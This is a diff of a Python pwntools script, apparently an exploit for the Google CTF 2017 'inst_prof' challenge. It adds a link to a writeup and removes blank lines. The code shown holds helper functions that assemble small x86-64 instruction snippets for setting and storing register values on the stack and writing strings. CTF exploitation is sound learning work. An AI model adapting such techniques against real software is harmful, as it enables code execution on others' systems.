@@ -1,7 +1,8 @@
+# from https://develbranch.com/ctf/google-ctf-2017-inst-prof-writeup.html
+
 from pwn import *
  
 context.arch = ELF('./inst_prof').arch
- 
  
 def assemble(code):
     encoding = asm(code)
@@ -11,21 +12,17 @@ def assemble(code):
         encoding += '\xc3'
     return encoding
  
- 
 def set_byte_r15(n):
     if n <= 0x7f:
         return assemble('push %d; pop r15' % n)
     else:
         return assemble('xor r15, r15') + assemble('inc r15') * n
  
- 
 def store_r15(offset):
     return assemble('push rsp; pop r14') + assemble('inc r14') * offset + assemble('mov [r14], r15')
  
- 
 def load_to_r15(offset):
     return assemble('push rsp; pop r14') + assemble('inc r14') * offset + assemble('mov r15, [r14]')
- 
  
 def write_string(offset, s):
     encoding = ''
